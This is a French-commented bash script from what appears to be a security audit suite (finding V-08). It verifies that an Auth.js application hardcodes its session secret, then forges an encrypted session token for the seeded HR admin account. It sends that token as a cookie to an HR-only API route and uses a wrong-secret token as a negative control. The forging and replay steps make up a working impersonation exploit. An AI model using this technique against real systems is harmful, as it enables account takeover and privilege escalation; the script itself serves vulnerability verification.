#!/usr/bin/env bash
# V-08 — Le secret Auth.js est une constante du code (src/lib/auth.ts:8) et la
# variable d'environnement AUTH_SECRET est ignorée (passée en 'secret' l.11).
# On fabrique HORS-LIGNE un jeton de session chiffré (JWE) avec ce secret connu,
# pour un id et un rôle arbitraires, et on vérifie qu'il est accepté par l'app.
set -u
cd "$(dirname "$0")"; . ./_lib.sh
require_app

echo "== 1. Confirmation par lecture : AUTH_SECRET ignoré au profit de la constante =="
grep -n "AUTH_SECRET\|secret:" "$APP_DIR/src/lib/auth.ts" | sed 's/^/   /'
echo "   (.env : AUTH_SECRET=$(grep -E '^AUTH_SECRET' "$APP_DIR/.env" | cut -d= -f2-) — valeur d'exemple, non utilisée)"

# Cible : le vrai hr_admin du seed. Un attaquant n'aurait besoin que d'un UUID
# quelconque ; on prend l'id réel pour montrer l'usurpation complète.
HR_ID="$(pq "SELECT id FROM users WHERE email='$HR_EMAIL';")"
[ -n "$HR_ID" ] || fail2 "compte RH du seed introuvable (lancer 'npm run seed')"
note "cible hr_admin = $HR_ID"

echo "== 2. Jeton forgé hors-ligne avec le secret du code, rôle hr_admin =="
FORGED="$(forge_token "$HR_ID" "hr_admin")"
[ -n "$FORGED" ] || fail2 "échec de la génération du jeton (node/next-auth)"
note "jeton JWE (${#FORGED} octets) : ${FORGED:0:40}..."

echo "== 3. Appel d'une route réservée RH avec le cookie forgé =="
CODE="$(curl -s -o "$WORK/hr.out" -b "authjs.session-token=$FORGED" -w '%{http_code}' "$BASE_URL/api/hr/users")"
note "GET /api/hr/users => HTTP $CODE"
note "corps: $(head -c 160 "$WORK/hr.out")"

echo "== 4. Contrôle négatif : un jeton forgé avec un MAUVAIS secret est refusé =="
BAD="$( cd "$APP_DIR" && node --input-type=module -e "
import { encode } from 'next-auth/jwt'
process.stdout.write(await encode({ token:{id:'$HR_ID',role:'hr_admin'}, secret:'wrong-secret-0000000000000000000000', salt:'authjs.session-token' }))" )"
BADCODE="$(curl -s -o /dev/null -b "authjs.session-token=$BAD" -w '%{http_code}' "$BASE_URL/api/hr/users")"
note "avec mauvais secret => HTTP $BADCODE (attendu 401/403)"

echo
if [ "$CODE" = "200" ] && [ "$BADCODE" != "200" ]; then
  echo "=> Un jeton fabriqué hors-ligne avec le secret en dur est accepté :"
  echo "   usurpation d'identité et de rôle (hr_admin) sans mot de passe."
  verdict CONFIRMÉ
else
  echo "=> Jeton forgé non accepté (secret=$CODE, mauvais=$BADCODE)."
  verdict RÉFUTÉ
fi
